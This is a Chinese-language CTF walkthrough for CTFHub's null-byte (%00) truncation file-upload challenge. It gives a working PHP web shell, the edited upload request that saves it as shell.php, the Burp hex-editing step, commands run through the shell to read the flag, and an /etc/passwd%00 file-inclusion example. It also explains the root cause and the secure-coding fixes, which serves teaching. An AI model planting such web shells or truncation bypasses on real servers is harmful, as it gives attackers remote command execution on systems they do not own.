CTFHub 文件上传 - 00截断

2026年9月22日 CTFHub Web安全 文件上传 00截断

一、题目信息

  • 题目名称：文件上传 - 00截断
  • 题目平台：CTFHub 技能树
  • 题目类型：Web安全 / 文件上传漏洞 / 空字节注入截断
  • 靶场链接：http://challenge-d773b3eee1695651.sandbox.ctfhub.com:10800（动态环境）
  • 涉及工具：Chrome浏览器、Burp Suite 抓包工具、Base64在线解码工具

二、解题步骤

1. 分析题目考什么

本题的核心考点是PHP 5.2 版本及以下的 00 截断漏洞（Null Byte Injection）。服务器设置了白名单机制，仅允许上传图片格式。漏洞点在于后端将用户可控的 URL 参数（road）拼接到了保存路径中。攻击者可以利用 C 语言底层字符串以空字节 \0（URL 中为 %00）作为结束标志的特性，截断并丢弃路径后面的后缀，将恶意脚本保存为 .php 格式，实现 RCE。

2. 怎么想（破题思路）

  • 尝试上传 shell.php 被拦截，说明有白名单过滤。上传 shell.jpg 成功，但无法执行。
  • 通过查看源码（Burp 或响应包注释），发现保存路径由 $des = $_GET['road'] . "/" . ... . "." . $ext; 拼接而成。
  • 既然路经拼接用的是 road 参数，我们只要在 URL 的 road 参数末尾加上 %00，即可在底层截断后面的随机数和后缀，将文件强行存为 shell.php。

3. 怎么解（详细步骤与踩坑记录）

踩坑记录一：修改位置错误（在 filename 中截断）

踩坑情况：在 Burp 中拦截，试图修改 Body 里的 filename="shell.php%00.jpg"，结果上传后一直 404。

原因分析：后端代码提取了 filename 用于获取扩展名（白名单校验），但并没有用它拼接路径，而是用了 $_GET['road']。改 filename 对路径拼接毫无影响。

改进方式：必须回到请求的第一行，修改 URL：POST /?road=/var/www/html/upload/shell.php%00 HTTP/1.1。

踩坑记录二：Burp 文本模式下直接输 %00 失效

踩坑情况：在 URL 里手写 %00，放行后服务器依然保存成了乱码文件名或无法解析。

原因分析：Burp Suite 在 Raw 模式下，可能会将 %00 作为三个普通字符发送，而不是真正的空字节。

改进方式：切换到 Hex 模式（十六进制视图），找到 URL 中对应 %00 的位置，手动将其替换为真正的十六进制字节 00。这样底层 C 函数才能真正识别到截断。

详细实操步骤

第一步：准备文件

本地新建 shell.jpg（白名单绕过），写入代码：

<?php system($_GET['cmd']); ?>

代码逐字深度解析：

  • <?php：PHP 脚本起始标记。
  • system：执行外部系统命令并输出结果的内置函数。
  • ( )：函数参数括号。
  • $_GET：接收 HTTP GET 请求的全局数组。
  • [ 'cmd' ]：提取 URL 中名为 cmd 的参数。
  • ; 和 ?>：PHP 语句和脚本结束符。

第二步：抓包并修改 URL

开启 Burp 拦截，上传 shell.jpg。在 Burp 中修改请求第一行：

POST /?road=/var/www/html/upload/shell.php%00 HTTP/1.1

保持 Body 里的 filename="shell.jpg" 不变。放行。页面提示上传成功。

第三步：寻找并读取 Flag

1. 验证：http://.../upload/shell.php?cmd=ls /var/www/html/ 找到 flag_xxxx.php。
2. 读取：因为 cat 会触发 PHP 解析导致注释被吞，必须用 Base64 读取：
http://.../upload/shell.php?cmd=base64 /var/www/html/flag_xxxx.php
3. 在线 Base64 解码，得到最终 Flag：ctfhub{b905cd2623a389c741c6bdcc}。

4. 怎么迁移（跨领域联想）

  • 代码审计与漏洞挖掘：在审计源码时，只要看到 $_GET 或 $_POST 直接拼接进文件路径（如 include、move_uploaded_file、fopen），就要立刻联想是否存在截断或路径穿越漏洞。
  • 安全开发（SDL）：现代 PHP 已修复该漏洞。开发人员必须做到：绝不信任用户输入，对路径进行硬编码，使用 basename() 剥离路径，并对文件进行重命名（如 MD5 时间戳），彻底杜绝拼接。
  • CTF 其他题型：00 截断同样适用于本地文件包含（LFI）绕过后缀限制，例如 ?file=../../etc/passwd%00。

三、名词大全与原理深度复盘

1. 00 截断（Null Byte Injection）本质

在 C 语言中，字符串以空字符 \0（十六进制的 00）作为结束标志。PHP 底层由 C 实现，在 PHP 5.2 中，如果用户可控的字符串包含 \0，底层系统 API 在读取文件路径时会在此处停止，从而丢弃后续字符。这就是截断漏洞的根源。

2. 白名单校验与路径拼接分离的错误

代码先用 filename 的扩展名去白名单比对，通过后用 road 参数拼接。这种“校验逻辑”与“执行逻辑”使用不同变量的做法，导致攻击者可以控制执行逻辑（road）绕过校验逻辑（ext）。

3. move_uploaded_file 的底层机制

PHP 用于移动上传临时文件的函数。底层执行时会调用操作系统的文件系统调用。当传入路径包含空字节 \0 时，系统调用读取路径到 \0 停止，把原本的 shell.php%00/xx.jpg 变成真实的 shell.php。

四、题目思考

1. 这跟前面的题有什么区别？

  • 与 MIME 绕过的区别：MIME 是欺骗服务器“文件是什么类型”；00 截断是欺骗底层系统“文件名到此为止”。前者是逻辑层欺骗，后者是底层系统层欺骗。
  • 与 .htaccess 的区别：.htaccess 是修改服务器解析规则；00 截断是强行把文件存成 php 后缀，两者殊途同归，都是绕过上传限制并获得 RCE。

2. 这种题目的出现原因

历史遗留问题。PHP 5.2 时代风靡全球，开发者对安全认知不足，习惯直接用 $_GET 拼接路径。PHP 底层 C 实现的字符串处理缺陷导致空字节注入。现代版本（PHP 5.3.4+）已彻底修复。

3. 这种应用在实际中如何体现？

在真实渗透中，00 截断常用于：文件包含（LFI）绕过强制后缀，SQL 注入截断过滤，或者利用老旧系统的命令执行拼接。但现代环境中已非常罕见，更多是作为 CTF 教学案例。

4. 如何抽象理解概念（大白话理解）

把服务器文件系统比作仓库管理员：

  • 常规上传：你提交单子：“存一个文件，名字叫 shell.php%00/随便乱码.jpg”。
  • 白名单检查（前端的保安）：“根据单子，扩展名是 .jpg，合法，通过。”
  • 底层截断（仓库管理员）：管理员拿到单子看名字：“s-h-e-l-l-.-p-h-p-[停]”。管理员只要看到“空字符（%00）”就认为单子写完了，完全忽略后面的“/随便乱码.jpg”，按“shell.php”存进了仓库。
  • 最终结果：你成功骗过保安，把危险文件存成了解析器能执行的名字。

做一道题，就要往自己脑子里装点东西。
